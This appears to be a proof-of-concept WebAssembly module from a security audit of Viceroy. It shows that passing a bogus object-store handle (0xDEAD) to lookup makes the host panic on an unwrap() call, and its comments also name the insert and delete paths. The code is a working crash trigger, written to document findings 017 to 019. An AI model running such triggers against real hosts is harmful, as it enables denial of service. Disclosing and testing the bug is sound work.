;; PoC for findings 017, 018, 019: Invalid store handle panics in
;; object store lookup, insert, and delete paths.
;;
;; In src/wiggle_abi/obj_store_impl.rs, lookup (line 44), insert (line 109),
;; and delete_async (line 157) call get_kv_store_key(store).unwrap().
;; An invalid ObjectStoreHandle (never opened) causes a host panic.
;;
;; Trigger: serve this module with Viceroy and send any HTTP request.
;; Expected: host panic on the unwrap() when the bogus handle is used.

(module
  (import "fastly_object_store" "lookup"
    (func $object_store_lookup (param i32 i32 i32 i32) (result i32)))
  (import "fastly_object_store" "insert"
    (func $object_store_insert (param i32 i32 i32 i32) (result i32)))
  (import "fastly_object_store" "delete_async"
    (func $object_store_delete_async (param i32 i32 i32 i32) (result i32)))

  (memory (export "memory") 1)

  ;; String "key" at offset 0
  (data (i32.const 0) "testkey")

  (func (export "_start")
    ;; Call lookup with a bogus store handle (0xDEAD)
    ;; This will panic in get_kv_store_key(0xDEAD).unwrap()
    (call $object_store_lookup
      (i32.const 0xDEAD) ;; invalid store handle
      (i32.const 0)      ;; key pointer
      (i32.const 7)      ;; key length
      (i32.const 100)    ;; body_handle_out pointer
    )
    drop
  )
)
